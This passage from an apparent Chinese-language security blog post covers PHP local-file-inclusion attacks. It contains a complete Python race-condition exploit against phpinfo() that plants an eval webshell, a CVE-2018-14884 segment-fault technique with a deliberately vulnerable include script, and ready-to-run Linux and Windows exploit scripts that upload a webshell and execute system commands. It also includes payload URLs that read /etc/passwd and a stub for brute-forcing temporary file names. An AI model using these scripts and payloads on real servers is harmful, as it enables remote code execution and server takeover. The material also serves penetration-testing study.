class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line">exp.py</span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#python version 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>(<span class="params">host, port</span>):</span><br><span class="line">    TAG = <span class="string">&quot;Security Test&quot;</span></span><br><span class="line">    PAYLOAD = <span class="string">&quot;&quot;&quot;%sr</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents(&#x27;/tmp/Qftm&#x27;, &#x27;&lt;?php eval($_REQUEST[Qftm])?&gt;&#x27;)?&gt;r&quot;&quot;&quot;</span> % TAG</span><br><span class="line">    <span class="comment"># PAYLOAD = &quot;&quot;&quot;%sr</span></span><br><span class="line">    <span class="comment"># &lt;?php file_put_contents(&#x27;/var/www/html/Qftm.php&#x27;, &#x27;&lt;?php eval($_REQUEST[Qftm])?&gt;&#x27;)?&gt;r&quot;&quot;&quot; % TAG</span></span><br><span class="line">    REQ1_DATA = <span class="string">&quot;&quot;&quot;-----------------------------7dbff1ded0714r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;r</span></span><br><span class="line"><span class="string">Content-Type: text/plainr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--r&quot;&quot;&quot;</span> % PAYLOAD</span><br><span class="line">    padding = <span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">    REQ1 = <span class="string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot; HTTP/1.1r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714r</span></span><br><span class="line"><span class="string">Content-Length: %sr</span></span><br><span class="line"><span class="string">Host: %sr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">%s&quot;&quot;&quot;</span> % (<span class="built_in">len</span>(REQ1_DATA), host, REQ1_DATA)</span><br><span class="line">    <span class="comment"># modify this to suit the LFI script</span></span><br><span class="line">    LFIREQ = <span class="string">&quot;&quot;&quot;GET /index.php?file=%s HTTP/1.1r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Aliver</span></span><br><span class="line"><span class="string">Host: %sr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phpInfoLFI</span>(<span class="params">host, port, phpinforeq, offset, lfireq, tag</span>):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">        fn = d[i + <span class="number">17</span>:i + <span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadWorker</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, e, l, m, *args</span>):</span><br><span class="line">        threading.Thread.__init__(<span class="variable language_">self</span>)</span><br><span class="line">        <span class="variable language_">self</span>.event = e</span><br><span class="line">        <span class="variable language_">self</span>.lock = l</span><br><span class="line">        <span class="variable language_">self</span>.maxattempts = m</span><br><span class="line">        <span class="variable language_">self</span>.args = args</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> <span class="variable language_">self</span>.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> <span class="variable language_">self</span>.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= <span class="variable language_">self</span>.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*<span class="variable language_">self</span>.args)</span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&quot;nGot it! Shell created in /tmp/Qftm.php&quot;</span></span><br><span class="line">                    <span class="variable language_">self</span>.event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line"></span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d += i</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">&quot;0rnrn&quot;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;No php tmp_name in phpinfo output&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;found %s at %i&quot;</span> % (d[i:i + <span class="number">10</span>], i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i + <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;LFI With PHPInfo()&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;-=&quot;</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port = <span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz = <span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = <span class="built_in">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Getting initial offset...&quot;</span>,</span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write(<span class="string">&quot;r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Woot!  m/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;:(&quot;</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;nTelling threads to shutdown...&quot;</span></span><br><span class="line">        e.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Segment-Fault"><a href="#Segment-Fault" class="headerlink" title="Segment Fault"></a>Segment Fault</h1><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li><strong>利用条件</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7.0.0 &lt;= PHP Version &lt; 7.0.28</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在上面包含姿势中提到的包含临时文件，需要知道phpinfo同时还需条件竞争，但如果没有phpinfo的存在，我们就很难利用上述方法去getshell。</p>
+<p>那么如果目标不存在phpinfo，应该如何处理呢？这里可以用<code>php7 segment fault</code>特性（<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=75535">CVE-2018-14884</a>）进行Bypass。</p>
+<p>php代码中使用php:&#x2F;&#x2F;filter的过滤器<code>strip_tags</code> , 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不想phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>官方在PHP Version 7.0.28时已经修复该漏洞</p>
+<p><img src="https://p2.ssl.qhimg.com/t01c23acd8e061b02a4.png" alt="img"></p>
+<p>官方php7更新日志信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.php.net/ChangeLog-7.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>更具漏洞分析构造可利用的payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.33.6.145/index.php?file=php://filter/string.strip_tags/resource=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>这种包含会导致php执行过程中出现segment fault，此时上传文件，临时文件会被保存在<code>upload_tmp_dir</code>所指定的目录下，不会被删除，这样就能达成getshell的目的。</p>
+<h3 id="代码环境"><a href="#代码环境" class="headerlink" title="代码环境"></a>代码环境</h3><p><strong>测试代码</strong></p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>dir.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;dir&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$a</span>));</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
+
+<p><strong>测试环境</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP Version 7.0.9</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p0.ssl.qhimg.com/t01a330620896b3cd5c.png" alt="img"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>攻击载荷</strong></p>
+<p>string.strip_tags过滤器导致出现php segment fault</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://filter/string.strip_tags/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p4.ssl.qhimg.com/t013523944235c9f89d.png" alt="img"></p>
+<p>可以看到上面这种包含会导致php执行过程中出现错误，此时上传文件，临时文件会被保存在<code>upload_tmp_dir</code>所指定的目录下，从而不会被删除，一直存储在服务的临时目录里面。</p>
+<p><strong>攻击利用-技巧1</strong></p>
+<p>我们可以通过<code>dir.php</code>辅助查找生成的临时文件</p>
+<p><strong>编写 Linux Exp</strong></p>
+<p>Linux网络攻击环境下的脚本编写</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python version 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">&#x27;&lt;?php eval($_REQUEST[Qftm]);&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">url1 = <span class="string">&#x27;http://192.168.68.119/index.php?file=php://filter/string.strip_tags/resource=index.php&#x27;</span></span><br><span class="line">r = requests.post(url=url1, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">url2 = <span class="string">&#x27;http://192.168.68.119/dir.php?dir=/tmp/&#x27;</span></span><br><span class="line">r = requests.get(url2)</span><br><span class="line">data = re.search(<span class="string">r&quot;php[a-zA-Z0-9]&#123;1,&#125;&quot;</span>, r.content).group(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"><span class="built_in">print</span> data</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"></span><br><span class="line">url3=<span class="string">&#x27;http://192.168.68.119/index.php?file=/tmp/&#x27;</span>+data</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;Qftm&#x27;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r =  requests.post(url=url3,data=data)</span><br><span class="line"><span class="built_in">print</span> r.content</span><br></pre></td></tr></table></figure>
+
+<p><strong>编写 Windows Exp</strong></p>
+<p>windows网络攻击环境下的脚本编写</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python version 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">&#x27;&lt;?php eval($_REQUEST[Qftm]);&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">url1 = <span class="string">&#x27;http://192.168.68.119/web/fi/index.php?file=php://filter/string.strip_tags/resource=index.php&#x27;</span></span><br><span class="line">r = requests.post(url=url1, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">url2 = <span class="string">&#x27;http://192.168.68.119/web/fi/dir.php?dir=C:/Windows/&#x27;</span></span><br><span class="line">r = requests.get(url2)</span><br><span class="line">data = re.search(<span class="string">r&quot;php[a-zA-Z0-9]&#123;1,&#125;&quot;</span>, r.content).group(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"><span class="built_in">print</span> data</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"></span><br><span class="line">url3=<span class="string">&#x27;http://192.168.68.119/web/fi/index.php?file=C:/Windows/&#x27;</span>+data+<span class="string">&#x27;.tmp&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;Qftm&#x27;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r =  requests.post(url=url3,data=data)</span><br><span class="line"><span class="built_in">print</span> r.content</span><br></pre></td></tr></table></figure>
+
+<p><strong>系统EXP利用</strong></p>
+<p>针对不同的系统环境运行脚本就可以RCE拿到任意代码执行</p>
+<p><img src="https://p2.ssl.qhimg.com/t013499c43603f5729c.png" alt="img"></p>
+<p>然后查看服务器上恶意临时文件，确实存在未被删除！！</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span><span class="number">.68</span><span class="number">.119</span>/web/fi/dir.php?file=C:<span class="regexp">/Windows/</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p2.ssl.qhimg.com/t012912d8076af5977e.png" alt="img"></p>
+<p><strong>Getshell</strong></p>
+<p>由于我们上传的恶意临时文件没有被删除，那么就可以使用Webshell管理工具蚁剑对<code>php2EFF.tmp</code>进行包含利用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Windows/php2EF.tmp  <span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[Qftm])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p1.ssl.qhimg.com/t017b97508bb73b833f.png" alt="img"></p>
+<p><strong>攻击利用-技巧2</strong></p>
+<p><strong>暴力破解</strong></p>
+<p>假如没有<code>dir.php</code>还能利用吗，答案是可以的，因为我们传入的恶意文件没有被删除，这样我们就可以爆破这个文件的文件名。</p>
+<p>在上面的讲述中，我们知道不同的系统默认的临时文件存储路径和方式都不一样</p>
+<ul>
+<li>Linux</li>
+</ul>
+<p>Linux临时文件主要存储在<code>/tmp/</code>目录下，格式通常是（<code>/tmp/php[6个随机字符]</code>）</p>
+<ul>
+<li>windows</li>
+</ul>
+<p>Windows临时文件主要存储在<code>C:/Windows/</code>目录下，格式通常是（<code>C:/Windows/php[4个随机字符].tmp</code>）</p>
+<p>对比Linux和Windows来看，Windows需要破解的位数比Linux少，从而Windows会比Linux破解速度快，位数越长所需要耗费的时间就越大。</p>
+<p><strong>攻击载荷</strong></p>
+<p>编写临时文件生成和暴力破解攻击载荷</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python version 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">&#x27;&lt;?php eval($_REQUEST[Qftm]);&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">url1 = <span class="string">&#x27;http://192.168.68.119/web/fi/index.php?file=php://filter/string.strip_tags/resource=index.php&#x27;</span></span><br><span class="line">r = requests.post(url=url1, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">########################暴力破解模块########################</span></span><br><span class="line">url2=<span class="string">&#x27;http://192.168.68.119/web/fi/index.php?file=C:/Windows/php&#x27;</span>+&#123;fuzz&#125;+<span class="string">&#x27;.tmp&amp;Qftm=system(&#x27;</span>whoami<span class="string">&#x27;);&#x27;</span></span><br><span class="line">data = fuzz</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"><span class="built_in">print</span> data</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"><span class="comment">########################暴力破解模块########################</span></span><br></pre></td></tr></table></figure>
+
+<p>对于暴力破解模块，可以自己添加多线程模块进行暴力破解，也可以将暴力破解模块拿出来单独进行fuzz，或者比较常用的做法就是将一些fuzz工具的模块拿出来添加到里面稍微改一下接口就可以直接使用。</p>
+<p>推荐使用fuzz工具直接进行fuzz测试，fuzz工具一般都包含多线程、自定义字典等，使用起来很方便，不用花费时间去编写调试代码。</p>
+<p>个人比较喜欢使用Fuzz大法，不管是目录扫描、后台扫描、Web漏洞模糊测试都是非常灵活的。</p>
+<p>推荐几款好用的Fuzz工具</p>
